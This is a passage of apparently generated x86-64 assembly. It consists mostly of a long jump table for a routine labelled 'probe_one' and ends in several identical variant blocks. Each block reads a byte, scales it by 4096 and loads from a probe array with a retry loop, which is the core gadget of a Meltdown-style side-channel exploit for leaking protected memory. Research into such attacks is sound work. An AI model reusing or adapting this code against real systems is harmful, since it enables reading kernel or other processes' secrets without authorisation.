	je	.Lprobe_one_win0_var4558
	cmpl	$4559, %eax
	je	.Lprobe_one_win0_var4559
	cmpl	$4560, %eax
	je	.Lprobe_one_win0_var4560
	cmpl	$4561, %eax
	je	.Lprobe_one_win0_var4561
	cmpl	$4562, %eax
	je	.Lprobe_one_win0_var4562
	cmpl	$4563, %eax
	je	.Lprobe_one_win0_var4563
	cmpl	$4564, %eax
	je	.Lprobe_one_win0_var4564
	cmpl	$4565, %eax
	je	.Lprobe_one_win0_var4565
	cmpl	$4566, %eax
	je	.Lprobe_one_win0_var4566
	cmpl	$4567, %eax
	je	.Lprobe_one_win0_var4567
	cmpl	$4568, %eax
	je	.Lprobe_one_win0_var4568
	cmpl	$4569, %eax
	je	.Lprobe_one_win0_var4569
	cmpl	$4570, %eax
	je	.Lprobe_one_win0_var4570
	cmpl	$4571, %eax
	je	.Lprobe_one_win0_var4571
	cmpl	$4572, %eax
	je	.Lprobe_one_win0_var4572
	cmpl	$4573, %eax
	je	.Lprobe_one_win0_var4573
	cmpl	$4574, %eax
	je	.Lprobe_one_win0_var4574
	cmpl	$4575, %eax
	je	.Lprobe_one_win0_var4575
	cmpl	$4576, %eax
	je	.Lprobe_one_win0_var4576
	cmpl	$4577, %eax
	je	.Lprobe_one_win0_var4577
	cmpl	$4578, %eax
	je	.Lprobe_one_win0_var4578
	cmpl	$4579, %eax
	je	.Lprobe_one_win0_var4579
	cmpl	$4580, %eax
	je	.Lprobe_one_win0_var4580
	cmpl	$4581, %eax
	je	.Lprobe_one_win0_var4581
	cmpl	$4582, %eax
	je	.Lprobe_one_win0_var4582
	cmpl	$4583, %eax
	je	.Lprobe_one_win0_var4583
	cmpl	$4584, %eax
	je	.Lprobe_one_win0_var4584
	cmpl	$4585, %eax
	je	.Lprobe_one_win0_var4585
	cmpl	$4586, %eax
	je	.Lprobe_one_win0_var4586
	cmpl	$4587, %eax
	je	.Lprobe_one_win0_var4587
	cmpl	$4588, %eax
	je	.Lprobe_one_win0_var4588
	cmpl	$4589, %eax
	je	.Lprobe_one_win0_var4589
	cmpl	$4590, %eax
	je	.Lprobe_one_win0_var4590
	cmpl	$4591, %eax
	je	.Lprobe_one_win0_var4591
	cmpl	$4592, %eax
	je	.Lprobe_one_win0_var4592
	cmpl	$4593, %eax
	je	.Lprobe_one_win0_var4593
	cmpl	$4594, %eax
	je	.Lprobe_one_win0_var4594
	cmpl	$4595, %eax
	je	.Lprobe_one_win0_var4595
	cmpl	$4596, %eax
	je	.Lprobe_one_win0_var4596
	cmpl	$4597, %eax
	je	.Lprobe_one_win0_var4597
	cmpl	$4598, %eax
	je	.Lprobe_one_win0_var4598
	cmpl	$4599, %eax
	je	.Lprobe_one_win0_var4599
	cmpl	$4600, %eax
	je	.Lprobe_one_win0_var4600
	cmpl	$4601, %eax
	je	.Lprobe_one_win0_var4601
	cmpl	$4602, %eax
	je	.Lprobe_one_win0_var4602
	cmpl	$4603, %eax
	je	.Lprobe_one_win0_var4603
	cmpl	$4604, %eax
	je	.Lprobe_one_win0_var4604
	cmpl	$4605, %eax
	je	.Lprobe_one_win0_var4605
	cmpl	$4606, %eax
	je	.Lprobe_one_win0_var4606
	cmpl	$4607, %eax
	je	.Lprobe_one_win0_var4607
	cmpl	$4608, %eax
	je	.Lprobe_one_win0_var4608
	cmpl	$4609, %eax
	je	.Lprobe_one_win0_var4609
	cmpl	$4610, %eax
	je	.Lprobe_one_win0_var4610
	cmpl	$4611, %eax
	je	.Lprobe_one_win0_var4611
	cmpl	$4612, %eax
	je	.Lprobe_one_win0_var4612
	cmpl	$4613, %eax
	je	.Lprobe_one_win0_var4613
	cmpl	$4614, %eax
	je	.Lprobe_one_win0_var4614
	cmpl	$4615, %eax
	je	.Lprobe_one_win0_var4615
	cmpl	$4616, %eax
	je	.Lprobe_one_win0_var4616
	cmpl	$4617, %eax
	je	.Lprobe_one_win0_var4617
	cmpl	$4618, %eax
	je	.Lprobe_one_win0_var4618
	cmpl	$4619, %eax
	je	.Lprobe_one_win0_var4619
	cmpl	$4620, %eax
	je	.Lprobe_one_win0_var4620
	cmpl	$4621, %eax
	je	.Lprobe_one_win0_var4621
	cmpl	$4622, %eax
	je	.Lprobe_one_win0_var4622
	cmpl	$4623, %eax
	je	.Lprobe_one_win0_var4623
	cmpl	$4624, %eax
	je	.Lprobe_one_win0_var4624
	cmpl	$4625, %eax
	je	.Lprobe_one_win0_var4625
	cmpl	$4626, %eax
	je	.Lprobe_one_win0_var4626
	cmpl	$4627, %eax
	je	.Lprobe_one_win0_var4627
	cmpl	$4628, %eax
	je	.Lprobe_one_win0_var4628
	cmpl	$4629, %eax
	je	.Lprobe_one_win0_var4629
	cmpl	$4630, %eax
	je	.Lprobe_one_win0_var4630
	cmpl	$4631, %eax
	je	.Lprobe_one_win0_var4631
	cmpl	$4632, %eax
	je	.Lprobe_one_win0_var4632
	cmpl	$4633, %eax
	je	.Lprobe_one_win0_var4633
	cmpl	$4634, %eax
	je	.Lprobe_one_win0_var4634
	cmpl	$4635, %eax
	je	.Lprobe_one_win0_var4635
	cmpl	$4636, %eax
	je	.Lprobe_one_win0_var4636
	cmpl	$4637, %eax
	je	.Lprobe_one_win0_var4637
	cmpl	$4638, %eax
	je	.Lprobe_one_win0_var4638
	cmpl	$4639, %eax
	je	.Lprobe_one_win0_var4639
	cmpl	$4640, %eax
	je	.Lprobe_one_win0_var4640
	cmpl	$4641, %eax
	je	.Lprobe_one_win0_var4641
	cmpl	$4642, %eax
	je	.Lprobe_one_win0_var4642
	cmpl	$4643, %eax
	je	.Lprobe_one_win0_var4643
	cmpl	$4644, %eax
	je	.Lprobe_one_win0_var4644
	cmpl	$4645, %eax
	je	.Lprobe_one_win0_var4645
	cmpl	$4646, %eax
	je	.Lprobe_one_win0_var4646
	cmpl	$4647, %eax
	je	.Lprobe_one_win0_var4647
	cmpl	$4648, %eax
	je	.Lprobe_one_win0_var4648
	cmpl	$4649, %eax
	je	.Lprobe_one_win0_var4649
	cmpl	$4650, %eax
	je	.Lprobe_one_win0_var4650
	cmpl	$4651, %eax
	je	.Lprobe_one_win0_var4651
	cmpl	$4652, %eax
	je	.Lprobe_one_win0_var4652
	cmpl	$4653, %eax
	je	.Lprobe_one_win0_var4653
	cmpl	$4654, %eax
	je	.Lprobe_one_win0_var4654
	cmpl	$4655, %eax
	je	.Lprobe_one_win0_var4655
	cmpl	$4656, %eax
	je	.Lprobe_one_win0_var4656
	cmpl	$4657, %eax
	je	.Lprobe_one_win0_var4657
	cmpl	$4658, %eax
	je	.Lprobe_one_win0_var4658
	cmpl	$4659, %eax
	je	.Lprobe_one_win0_var4659
	cmpl	$4660, %eax
	je	.Lprobe_one_win0_var4660
	cmpl	$4661, %eax
	je	.Lprobe_one_win0_var4661
	cmpl	$4662, %eax
	je	.Lprobe_one_win0_var4662
	cmpl	$4663, %eax
	je	.Lprobe_one_win0_var4663
	cmpl	$4664, %eax
	je	.Lprobe_one_win0_var4664
	cmpl	$4665, %eax
	je	.Lprobe_one_win0_var4665
	cmpl	$4666, %eax
	je	.Lprobe_one_win0_var4666
	cmpl	$4667, %eax
	je	.Lprobe_one_win0_var4667
	cmpl	$4668, %eax
	je	.Lprobe_one_win0_var4668
	cmpl	$4669, %eax
	je	.Lprobe_one_win0_var4669
	cmpl	$4670, %eax
	je	.Lprobe_one_win0_var4670
	cmpl	$4671, %eax
	je	.Lprobe_one_win0_var4671
	cmpl	$4672, %eax
	je	.Lprobe_one_win0_var4672
	cmpl	$4673, %eax
	je	.Lprobe_one_win0_var4673
	cmpl	$4674, %eax
	je	.Lprobe_one_win0_var4674
	cmpl	$4675, %eax
	je	.Lprobe_one_win0_var4675
	cmpl	$4676, %eax
	je	.Lprobe_one_win0_var4676
	cmpl	$4677, %eax
	je	.Lprobe_one_win0_var4677
	cmpl	$4678, %eax
	je	.Lprobe_one_win0_var4678
	cmpl	$4679, %eax
	je	.Lprobe_one_win0_var4679
	cmpl	$4680, %eax
	je	.Lprobe_one_win0_var4680
	cmpl	$4681, %eax
	je	.Lprobe_one_win0_var4681
	cmpl	$4682, %eax
	je	.Lprobe_one_win0_var4682
	cmpl	$4683, %eax
	je	.Lprobe_one_win0_var4683
	cmpl	$4684, %eax
	je	.Lprobe_one_win0_var4684
	cmpl	$4685, %eax
	je	.Lprobe_one_win0_var4685
	cmpl	$4686, %eax
	je	.Lprobe_one_win0_var4686
	cmpl	$4687, %eax
	je	.Lprobe_one_win0_var4687
	cmpl	$4688, %eax
	je	.Lprobe_one_win0_var4688
	cmpl	$4689, %eax
	je	.Lprobe_one_win0_var4689
	cmpl	$4690, %eax
	je	.Lprobe_one_win0_var4690
	cmpl	$4691, %eax
	je	.Lprobe_one_win0_var4691
	cmpl	$4692, %eax
	je	.Lprobe_one_win0_var4692
	cmpl	$4693, %eax
	je	.Lprobe_one_win0_var4693
	cmpl	$4694, %eax
	je	.Lprobe_one_win0_var4694
	cmpl	$4695, %eax
	je	.Lprobe_one_win0_var4695
	cmpl	$4696, %eax
	je	.Lprobe_one_win0_var4696
	cmpl	$4697, %eax
	je	.Lprobe_one_win0_var4697
	cmpl	$4698, %eax
	je	.Lprobe_one_win0_var4698
	cmpl	$4699, %eax
	je	.Lprobe_one_win0_var4699
	cmpl	$4700, %eax
	je	.Lprobe_one_win0_var4700
	cmpl	$4701, %eax
	je	.Lprobe_one_win0_var4701
	cmpl	$4702, %eax
	je	.Lprobe_one_win0_var4702
	cmpl	$4703, %eax
	je	.Lprobe_one_win0_var4703
	cmpl	$4704, %eax
	je	.Lprobe_one_win0_var4704
	cmpl	$4705, %eax
	je	.Lprobe_one_win0_var4705
	cmpl	$4706, %eax
	je	.Lprobe_one_win0_var4706
	cmpl	$4707, %eax
	je	.Lprobe_one_win0_var4707
	cmpl	$4708, %eax
	je	.Lprobe_one_win0_var4708
	cmpl	$4709, %eax
	je	.Lprobe_one_win0_var4709
	cmpl	$4710, %eax
	je	.Lprobe_one_win0_var4710
	cmpl	$4711, %eax
	je	.Lprobe_one_win0_var4711
	cmpl	$4712, %eax
	je	.Lprobe_one_win0_var4712
	cmpl	$4713, %eax
	je	.Lprobe_one_win0_var4713
	cmpl	$4714, %eax
	je	.Lprobe_one_win0_var4714
	cmpl	$4715, %eax
	je	.Lprobe_one_win0_var4715
	cmpl	$4716, %eax
	je	.Lprobe_one_win0_var4716
	cmpl	$4717, %eax
	je	.Lprobe_one_win0_var4717
	cmpl	$4718, %eax
	je	.Lprobe_one_win0_var4718
	cmpl	$4719, %eax
	je	.Lprobe_one_win0_var4719
	cmpl	$4720, %eax
	je	.Lprobe_one_win0_var4720
	cmpl	$4721, %eax
	je	.Lprobe_one_win0_var4721
	cmpl	$4722, %eax
	je	.Lprobe_one_win0_var4722
	cmpl	$4723, %eax
	je	.Lprobe_one_win0_var4723
	cmpl	$4724, %eax
	je	.Lprobe_one_win0_var4724
	cmpl	$4725, %eax
	je	.Lprobe_one_win0_var4725
	cmpl	$4726, %eax
	je	.Lprobe_one_win0_var4726
	cmpl	$4727, %eax
	je	.Lprobe_one_win0_var4727
	cmpl	$4728, %eax
	je	.Lprobe_one_win0_var4728
	cmpl	$4729, %eax
	je	.Lprobe_one_win0_var4729
	cmpl	$4730, %eax
	je	.Lprobe_one_win0_var4730
	cmpl	$4731, %eax
	je	.Lprobe_one_win0_var4731
	cmpl	$4732, %eax
	je	.Lprobe_one_win0_var4732
	cmpl	$4733, %eax
	je	.Lprobe_one_win0_var4733
	cmpl	$4734, %eax
	je	.Lprobe_one_win0_var4734
	cmpl	$4735, %eax
	je	.Lprobe_one_win0_var4735
	cmpl	$4736, %eax
	je	.Lprobe_one_win0_var4736
	cmpl	$4737, %eax
	je	.Lprobe_one_win0_var4737
	cmpl	$4738, %eax
	je	.Lprobe_one_win0_var4738
	cmpl	$4739, %eax
	je	.Lprobe_one_win0_var4739
	cmpl	$4740, %eax
	je	.Lprobe_one_win0_var4740
	cmpl	$4741, %eax
	je	.Lprobe_one_win0_var4741
	cmpl	$4742, %eax
	je	.Lprobe_one_win0_var4742
	cmpl	$4743, %eax
	je	.Lprobe_one_win0_var4743
	cmpl	$4744, %eax
	je	.Lprobe_one_win0_var4744
	cmpl	$4745, %eax
	je	.Lprobe_one_win0_var4745
	cmpl	$4746, %eax
	je	.Lprobe_one_win0_var4746
	cmpl	$4747, %eax
	je	.Lprobe_one_win0_var4747
	cmpl	$4748, %eax
	je	.Lprobe_one_win0_var4748
	cmpl	$4749, %eax
	je	.Lprobe_one_win0_var4749
	cmpl	$4750, %eax
	je	.Lprobe_one_win0_var4750
	cmpl	$4751, %eax
	je	.Lprobe_one_win0_var4751
	cmpl	$4752, %eax
	je	.Lprobe_one_win0_var4752
	cmpl	$4753, %eax
	je	.Lprobe_one_win0_var4753
	cmpl	$4754, %eax
	je	.Lprobe_one_win0_var4754
	cmpl	$4755, %eax
	je	.Lprobe_one_win0_var4755
	cmpl	$4756, %eax
	je	.Lprobe_one_win0_var4756
	cmpl	$4757, %eax
	je	.Lprobe_one_win0_var4757
	cmpl	$4758, %eax
	je	.Lprobe_one_win0_var4758
	cmpl	$4759, %eax
	je	.Lprobe_one_win0_var4759
	cmpl	$4760, %eax
	je	.Lprobe_one_win0_var4760
	cmpl	$4761, %eax
	je	.Lprobe_one_win0_var4761
	cmpl	$4762, %eax
	je	.Lprobe_one_win0_var4762
	cmpl	$4763, %eax
	je	.Lprobe_one_win0_var4763
	cmpl	$4764, %eax
	je	.Lprobe_one_win0_var4764
	cmpl	$4765, %eax
	je	.Lprobe_one_win0_var4765
	cmpl	$4766, %eax
	je	.Lprobe_one_win0_var4766
	cmpl	$4767, %eax
	je	.Lprobe_one_win0_var4767
	cmpl	$4768, %eax
	je	.Lprobe_one_win0_var4768
	cmpl	$4769, %eax
	je	.Lprobe_one_win0_var4769
	cmpl	$4770, %eax
	je	.Lprobe_one_win0_var4770
	cmpl	$4771, %eax
	je	.Lprobe_one_win0_var4771
	cmpl	$4772, %eax
	je	.Lprobe_one_win0_var4772
	cmpl	$4773, %eax
	je	.Lprobe_one_win0_var4773
	cmpl	$4774, %eax
	je	.Lprobe_one_win0_var4774
	cmpl	$4775, %eax
	je	.Lprobe_one_win0_var4775
	cmpl	$4776, %eax
	je	.Lprobe_one_win0_var4776
	cmpl	$4777, %eax
	je	.Lprobe_one_win0_var4777
	cmpl	$4778, %eax
	je	.Lprobe_one_win0_var4778
	cmpl	$4779, %eax
	je	.Lprobe_one_win0_var4779
	cmpl	$4780, %eax
	je	.Lprobe_one_win0_var4780
	cmpl	$4781, %eax
	je	.Lprobe_one_win0_var4781
	cmpl	$4782, %eax
	je	.Lprobe_one_win0_var4782
	cmpl	$4783, %eax
	je	.Lprobe_one_win0_var4783
	cmpl	$4784, %eax
	je	.Lprobe_one_win0_var4784
	cmpl	$4785, %eax
	je	.Lprobe_one_win0_var4785
	cmpl	$4786, %eax
	je	.Lprobe_one_win0_var4786
	cmpl	$4787, %eax
	je	.Lprobe_one_win0_var4787
	cmpl	$4788, %eax
	je	.Lprobe_one_win0_var4788
	cmpl	$4789, %eax
	je	.Lprobe_one_win0_var4789
	cmpl	$4790, %eax
	je	.Lprobe_one_win0_var4790
	cmpl	$4791, %eax
	je	.Lprobe_one_win0_var4791
	cmpl	$4792, %eax
	je	.Lprobe_one_win0_var4792
	cmpl	$4793, %eax
	je	.Lprobe_one_win0_var4793
	cmpl	$4794, %eax
	je	.Lprobe_one_win0_var4794
	cmpl	$4795, %eax
	je	.Lprobe_one_win0_var4795
	cmpl	$4796, %eax
	je	.Lprobe_one_win0_var4796
	cmpl	$4797, %eax
	je	.Lprobe_one_win0_var4797
	cmpl	$4798, %eax
	je	.Lprobe_one_win0_var4798
	cmpl	$4799, %eax
	je	.Lprobe_one_win0_var4799
	cmpl	$4800, %eax
	je	.Lprobe_one_win0_var4800
	cmpl	$4801, %eax
	je	.Lprobe_one_win0_var4801
	cmpl	$4802, %eax
	je	.Lprobe_one_win0_var4802
	cmpl	$4803, %eax
	je	.Lprobe_one_win0_var4803
	cmpl	$4804, %eax
	je	.Lprobe_one_win0_var4804
	cmpl	$4805, %eax
	je	.Lprobe_one_win0_var4805
	cmpl	$4806, %eax
	je	.Lprobe_one_win0_var4806
	cmpl	$4807, %eax
	je	.Lprobe_one_win0_var4807
	cmpl	$4808, %eax
	je	.Lprobe_one_win0_var4808
	cmpl	$4809, %eax
	je	.Lprobe_one_win0_var4809
	cmpl	$4810, %eax
	je	.Lprobe_one_win0_var4810
	cmpl	$4811, %eax
	je	.Lprobe_one_win0_var4811
	cmpl	$4812, %eax
	je	.Lprobe_one_win0_var4812
	cmpl	$4813, %eax
	je	.Lprobe_one_win0_var4813
	cmpl	$4814, %eax
	je	.Lprobe_one_win0_var4814
	cmpl	$4815, %eax
	je	.Lprobe_one_win0_var4815
	cmpl	$4816, %eax
	je	.Lprobe_one_win0_var4816
	cmpl	$4817, %eax
	je	.Lprobe_one_win0_var4817
	cmpl	$4818, %eax
	je	.Lprobe_one_win0_var4818
	cmpl	$4819, %eax
	je	.Lprobe_one_win0_var4819
	cmpl	$4820, %eax
	je	.Lprobe_one_win0_var4820
	cmpl	$4821, %eax
	je	.Lprobe_one_win0_var4821
	cmpl	$4822, %eax
	je	.Lprobe_one_win0_var4822
	cmpl	$4823, %eax
	je	.Lprobe_one_win0_var4823
	cmpl	$4824, %eax
	je	.Lprobe_one_win0_var4824
	cmpl	$4825, %eax
	je	.Lprobe_one_win0_var4825
	cmpl	$4826, %eax
	je	.Lprobe_one_win0_var4826
	cmpl	$4827, %eax
	je	.Lprobe_one_win0_var4827
	cmpl	$4828, %eax
	je	.Lprobe_one_win0_var4828
	cmpl	$4829, %eax
	je	.Lprobe_one_win0_var4829
	cmpl	$4830, %eax
	je	.Lprobe_one_win0_var4830
	cmpl	$4831, %eax
	je	.Lprobe_one_win0_var4831
	cmpl	$4832, %eax
	je	.Lprobe_one_win0_var4832
	cmpl	$4833, %eax
	je	.Lprobe_one_win0_var4833
	cmpl	$4834, %eax
	je	.Lprobe_one_win0_var4834
	cmpl	$4835, %eax
	je	.Lprobe_one_win0_var4835
	cmpl	$4836, %eax
	je	.Lprobe_one_win0_var4836
	cmpl	$4837, %eax
	je	.Lprobe_one_win0_var4837
	cmpl	$4838, %eax
	je	.Lprobe_one_win0_var4838
	cmpl	$4839, %eax
	je	.Lprobe_one_win0_var4839
	cmpl	$4840, %eax
	je	.Lprobe_one_win0_var4840
	cmpl	$4841, %eax
	je	.Lprobe_one_win0_var4841
	cmpl	$4842, %eax
	je	.Lprobe_one_win0_var4842
	cmpl	$4843, %eax
	je	.Lprobe_one_win0_var4843
	cmpl	$4844, %eax
	je	.Lprobe_one_win0_var4844
	cmpl	$4845, %eax
	je	.Lprobe_one_win0_var4845
	cmpl	$4846, %eax
	je	.Lprobe_one_win0_var4846
	cmpl	$4847, %eax
	je	.Lprobe_one_win0_var4847
	cmpl	$4848, %eax
	je	.Lprobe_one_win0_var4848
	cmpl	$4849, %eax
	je	.Lprobe_one_win0_var4849
	cmpl	$4850, %eax
	je	.Lprobe_one_win0_var4850
	cmpl	$4851, %eax
	je	.Lprobe_one_win0_var4851
	cmpl	$4852, %eax
	je	.Lprobe_one_win0_var4852
	cmpl	$4853, %eax
	je	.Lprobe_one_win0_var4853
	cmpl	$4854, %eax
	je	.Lprobe_one_win0_var4854
	cmpl	$4855, %eax
	je	.Lprobe_one_win0_var4855
	cmpl	$4856, %eax
	je	.Lprobe_one_win0_var4856
	cmpl	$4857, %eax
	je	.Lprobe_one_win0_var4857
	cmpl	$4858, %eax
	je	.Lprobe_one_win0_var4858
	cmpl	$4859, %eax
	je	.Lprobe_one_win0_var4859
	cmpl	$4860, %eax
	je	.Lprobe_one_win0_var4860
	cmpl	$4861, %eax
	je	.Lprobe_one_win0_var4861
	cmpl	$4862, %eax
	je	.Lprobe_one_win0_var4862
	cmpl	$4863, %eax
	je	.Lprobe_one_win0_var4863
	cmpl	$4864, %eax
	je	.Lprobe_one_win0_var4864
	cmpl	$4865, %eax
	je	.Lprobe_one_win0_var4865
	cmpl	$4866, %eax
	je	.Lprobe_one_win0_var4866
	cmpl	$4867, %eax
	je	.Lprobe_one_win0_var4867
	cmpl	$4868, %eax
	je	.Lprobe_one_win0_var4868
	cmpl	$4869, %eax
	je	.Lprobe_one_win0_var4869
	cmpl	$4870, %eax
	je	.Lprobe_one_win0_var4870
	cmpl	$4871, %eax
	je	.Lprobe_one_win0_var4871
	cmpl	$4872, %eax
	je	.Lprobe_one_win0_var4872
	cmpl	$4873, %eax
	je	.Lprobe_one_win0_var4873
	cmpl	$4874, %eax
	je	.Lprobe_one_win0_var4874
	cmpl	$4875, %eax
	je	.Lprobe_one_win0_var4875
	cmpl	$4876, %eax
	je	.Lprobe_one_win0_var4876
	cmpl	$4877, %eax
	je	.Lprobe_one_win0_var4877
	cmpl	$4878, %eax
	je	.Lprobe_one_win0_var4878
	cmpl	$4879, %eax
	je	.Lprobe_one_win0_var4879
	cmpl	$4880, %eax
	je	.Lprobe_one_win0_var4880
	cmpl	$4881, %eax
	je	.Lprobe_one_win0_var4881
	cmpl	$4882, %eax
	je	.Lprobe_one_win0_var4882
	cmpl	$4883, %eax
	je	.Lprobe_one_win0_var4883
	cmpl	$4884, %eax
	je	.Lprobe_one_win0_var4884
	cmpl	$4885, %eax
	je	.Lprobe_one_win0_var4885
	cmpl	$4886, %eax
	je	.Lprobe_one_win0_var4886
	cmpl	$4887, %eax
	je	.Lprobe_one_win0_var4887
	cmpl	$4888, %eax
	je	.Lprobe_one_win0_var4888
	cmpl	$4889, %eax
	je	.Lprobe_one_win0_var4889
	cmpl	$4890, %eax
	je	.Lprobe_one_win0_var4890
	cmpl	$4891, %eax
	je	.Lprobe_one_win0_var4891
	cmpl	$4892, %eax
	je	.Lprobe_one_win0_var4892
	cmpl	$4893, %eax
	je	.Lprobe_one_win0_var4893
	cmpl	$4894, %eax
	je	.Lprobe_one_win0_var4894
	cmpl	$4895, %eax
	je	.Lprobe_one_win0_var4895
	cmpl	$4896, %eax
	je	.Lprobe_one_win0_var4896
	cmpl	$4897, %eax
	je	.Lprobe_one_win0_var4897
	cmpl	$4898, %eax
	je	.Lprobe_one_win0_var4898
	cmpl	$4899, %eax
	je	.Lprobe_one_win0_var4899
	cmpl	$4900, %eax
	je	.Lprobe_one_win0_var4900
	cmpl	$4901, %eax
	je	.Lprobe_one_win0_var4901
	cmpl	$4902, %eax
	je	.Lprobe_one_win0_var4902
	cmpl	$4903, %eax
	je	.Lprobe_one_win0_var4903
	cmpl	$4904, %eax
	je	.Lprobe_one_win0_var4904
	cmpl	$4905, %eax
	je	.Lprobe_one_win0_var4905
	cmpl	$4906, %eax
	je	.Lprobe_one_win0_var4906
	cmpl	$4907, %eax
	je	.Lprobe_one_win0_var4907
	cmpl	$4908, %eax
	je	.Lprobe_one_win0_var4908
	cmpl	$4909, %eax
	je	.Lprobe_one_win0_var4909
	cmpl	$4910, %eax
	je	.Lprobe_one_win0_var4910
	cmpl	$4911, %eax
	je	.Lprobe_one_win0_var4911
	cmpl	$4912, %eax
	je	.Lprobe_one_win0_var4912
	cmpl	$4913, %eax
	je	.Lprobe_one_win0_var4913
	cmpl	$4914, %eax
	je	.Lprobe_one_win0_var4914
	cmpl	$4915, %eax
	je	.Lprobe_one_win0_var4915
	cmpl	$4916, %eax
	je	.Lprobe_one_win0_var4916
	cmpl	$4917, %eax
	je	.Lprobe_one_win0_var4917
	cmpl	$4918, %eax
	je	.Lprobe_one_win0_var4918
	cmpl	$4919, %eax
	je	.Lprobe_one_win0_var4919
	cmpl	$4920, %eax
	je	.Lprobe_one_win0_var4920
	cmpl	$4921, %eax
	je	.Lprobe_one_win0_var4921
	cmpl	$4922, %eax
	je	.Lprobe_one_win0_var4922
	cmpl	$4923, %eax
	je	.Lprobe_one_win0_var4923
	cmpl	$4924, %eax
	je	.Lprobe_one_win0_var4924
	cmpl	$4925, %eax
	je	.Lprobe_one_win0_var4925
	cmpl	$4926, %eax
	je	.Lprobe_one_win0_var4926
	cmpl	$4927, %eax
	je	.Lprobe_one_win0_var4927
	cmpl	$4928, %eax
	je	.Lprobe_one_win0_var4928
	cmpl	$4929, %eax
	je	.Lprobe_one_win0_var4929
	cmpl	$4930, %eax
	je	.Lprobe_one_win0_var4930
	cmpl	$4931, %eax
	je	.Lprobe_one_win0_var4931
	cmpl	$4932, %eax
	je	.Lprobe_one_win0_var4932
	cmpl	$4933, %eax
	je	.Lprobe_one_win0_var4933
	cmpl	$4934, %eax
	je	.Lprobe_one_win0_var4934
	cmpl	$4935, %eax
	je	.Lprobe_one_win0_var4935
	cmpl	$4936, %eax
	je	.Lprobe_one_win0_var4936
	cmpl	$4937, %eax
	je	.Lprobe_one_win0_var4937
	cmpl	$4938, %eax
	je	.Lprobe_one_win0_var4938
	cmpl	$4939, %eax
	je	.Lprobe_one_win0_var4939
	cmpl	$4940, %eax
	je	.Lprobe_one_win0_var4940
	cmpl	$4941, %eax
	je	.Lprobe_one_win0_var4941
	cmpl	$4942, %eax
	je	.Lprobe_one_win0_var4942
	cmpl	$4943, %eax
	je	.Lprobe_one_win0_var4943
	cmpl	$4944, %eax
	je	.Lprobe_one_win0_var4944
	cmpl	$4945, %eax
	je	.Lprobe_one_win0_var4945
	cmpl	$4946, %eax
	je	.Lprobe_one_win0_var4946
	cmpl	$4947, %eax
	je	.Lprobe_one_win0_var4947
	cmpl	$4948, %eax
	je	.Lprobe_one_win0_var4948
	cmpl	$4949, %eax
	je	.Lprobe_one_win0_var4949
	cmpl	$4950, %eax
	je	.Lprobe_one_win0_var4950
	cmpl	$4951, %eax
	je	.Lprobe_one_win0_var4951
	cmpl	$4952, %eax
	je	.Lprobe_one_win0_var4952
	cmpl	$4953, %eax
	je	.Lprobe_one_win0_var4953
	cmpl	$4954, %eax
	je	.Lprobe_one_win0_var4954
	cmpl	$4955, %eax
	je	.Lprobe_one_win0_var4955
	cmpl	$4956, %eax
	je	.Lprobe_one_win0_var4956
	cmpl	$4957, %eax
	je	.Lprobe_one_win0_var4957
	cmpl	$4958, %eax
	je	.Lprobe_one_win0_var4958
	cmpl	$4959, %eax
	je	.Lprobe_one_win0_var4959
	cmpl	$4960, %eax
	je	.Lprobe_one_win0_var4960
	cmpl	$4961, %eax
	je	.Lprobe_one_win0_var4961
	cmpl	$4962, %eax
	je	.Lprobe_one_win0_var4962
	cmpl	$4963, %eax
	je	.Lprobe_one_win0_var4963
	cmpl	$4964, %eax
	je	.Lprobe_one_win0_var4964
	cmpl	$4965, %eax
	je	.Lprobe_one_win0_var4965
	cmpl	$4966, %eax
	je	.Lprobe_one_win0_var4966
	cmpl	$4967, %eax
	je	.Lprobe_one_win0_var4967
	cmpl	$4968, %eax
	je	.Lprobe_one_win0_var4968
	cmpl	$4969, %eax
	je	.Lprobe_one_win0_var4969
	cmpl	$4970, %eax
	je	.Lprobe_one_win0_var4970
	cmpl	$4971, %eax
	je	.Lprobe_one_win0_var4971
	cmpl	$4972, %eax
	je	.Lprobe_one_win0_var4972
	cmpl	$4973, %eax
	je	.Lprobe_one_win0_var4973
	cmpl	$4974, %eax
	je	.Lprobe_one_win0_var4974
	cmpl	$4975, %eax
	je	.Lprobe_one_win0_var4975
	cmpl	$4976, %eax
	je	.Lprobe_one_win0_var4976
	cmpl	$4977, %eax
	je	.Lprobe_one_win0_var4977
	cmpl	$4978, %eax
	je	.Lprobe_one_win0_var4978
	cmpl	$4979, %eax
	je	.Lprobe_one_win0_var4979
	cmpl	$4980, %eax
	je	.Lprobe_one_win0_var4980
	cmpl	$4981, %eax
	je	.Lprobe_one_win0_var4981
	cmpl	$4982, %eax
	je	.Lprobe_one_win0_var4982
	cmpl	$4983, %eax
	je	.Lprobe_one_win0_var4983
	cmpl	$4984, %eax
	je	.Lprobe_one_win0_var4984
	cmpl	$4985, %eax
	je	.Lprobe_one_win0_var4985
	cmpl	$4986, %eax
	je	.Lprobe_one_win0_var4986
	cmpl	$4987, %eax
	je	.Lprobe_one_win0_var4987
	cmpl	$4988, %eax
	je	.Lprobe_one_win0_var4988
	cmpl	$4989, %eax
	je	.Lprobe_one_win0_var4989
	cmpl	$4990, %eax
	je	.Lprobe_one_win0_var4990
	cmpl	$4991, %eax
	je	.Lprobe_one_win0_var4991
	cmpl	$4992, %eax
	je	.Lprobe_one_win0_var4992
	cmpl	$4993, %eax
	je	.Lprobe_one_win0_var4993
	cmpl	$4994, %eax
	je	.Lprobe_one_win0_var4994
	cmpl	$4995, %eax
	je	.Lprobe_one_win0_var4995
	cmpl	$4996, %eax
	je	.Lprobe_one_win0_var4996
	cmpl	$4997, %eax
	je	.Lprobe_one_win0_var4997
	cmpl	$4998, %eax
	je	.Lprobe_one_win0_var4998
	cmpl	$4999, %eax
	je	.Lprobe_one_win0_var4999
	jmp	.Lprobe_one_win0_var0
## Variant 0
.Lprobe_one_win0_var0:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 1
.Lprobe_one_win0_var1:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 2
.Lprobe_one_win0_var2:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 3
.Lprobe_one_win0_var3:
	popq	%rax
	addq	$32, %rsp
